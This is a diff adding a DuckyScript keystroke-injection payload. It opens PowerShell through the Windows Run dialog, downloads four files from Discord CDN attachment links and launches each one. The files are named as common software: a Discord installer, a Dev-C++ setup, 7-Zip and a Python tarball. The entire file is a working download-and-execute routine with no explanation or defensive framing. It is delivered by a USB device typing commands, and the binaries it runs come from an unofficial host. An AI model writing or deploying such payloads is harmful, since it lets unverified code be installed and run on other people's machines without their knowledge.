@@ -1,0 +1,62 @@
+REM Written by @dexv
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+
+STRING $url = "https://cdn.discordapp.com/attachments/1290507437933330545/1290507996832731166/DiscordSetup.exe?ex=67049fba&is=67034e3a&hm=444ca93c526e5eb902c64e57a38086b750e94862e450af1fd086f10011455ebb&"
+ENTER
+STRING $output = "$env:USERPROFILE\Downloads\DiscordSetup.exe"
+ENTER
+STRING $destination = "$env:USERPROFILE\Downloads"
+ENTER
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $output)
+ENTER
+DELAY 1000
+STRING Set-Location -Path $destination
+ENTER
+STRING Start-Process -FilePath ".\DiscordSetup.exe"
+ENTER
+
+STRING $url = "https://cdn.discordapp.com/attachments/1290507437933330545/1290507924548096021/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup_1.exe?ex=67049fa9&is=67034e29&hm=e58da96d4e352cfe0d9df1926e8cf87cd38032cf4ad6529167bceb8faa7c4d94&"
+ENTER
+STRING $output = "$env:USERPROFILE\Downloads\Dev-Cpp 5.11 TDM-GCC 4.9.2 Setup.exe"
+ENTER
+STRING $destination = "$env:USERPROFILE\Downloads"
+ENTER
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $output)
+ENTER
+STRING Set-Location -Path $destination
+ENTER
+STRING Start-Process -FilePath ".\Dev-Cpp 5.11 TDM-GCC 4.9.2 Setup.exe"
+ENTER
+
+STRING $url = "https://cdn.discordapp.com/attachments/1290507437933330545/1290508421795287040/7z2408-x64.exe?ex=6704a020&is=67034ea0&hm=0ae7493b414aaf242b97c32f10965a2c6308bb137df375fe9525b6eb794e010d&"
+ENTER
+STRING $output = "$env:USERPROFILE\Downloads\7z2408-x64.exe"
+ENTER
+STRING $destination = "$env:USERPROFILE\Downloads"
+ENTER
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $output)
+ENTER
+STRING Set-Location -Path $destination
+ENTER
+STRING Start-Process -FilePath ".\7z2408-x64.exe"
+ENTER
+
+
+STRING $url = "https://cdn.discordapp.com/attachments/1290507437933330545/1290508330242019338/Python-3.10.15.tgz?ex=6704a00a&is=67034e8a&hm=8fb5fa5c5cd0663e17d83de145689996c7f17a137c00bdcb045161329b155d2c&"
+ENTER
+STRING $output = "$env:USERPROFILE\Downloads\Python-3.10.15.tgz"
+ENTER
+STRING $destination = "$env:USERPROFILE\Downloads"
+ENTER
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $output)
+ENTER
+STRING Set-Location -Path $destination
+ENTER
+STRING Start-Process -FilePath ".\Python-3.10.15.tgz"
+ENTER
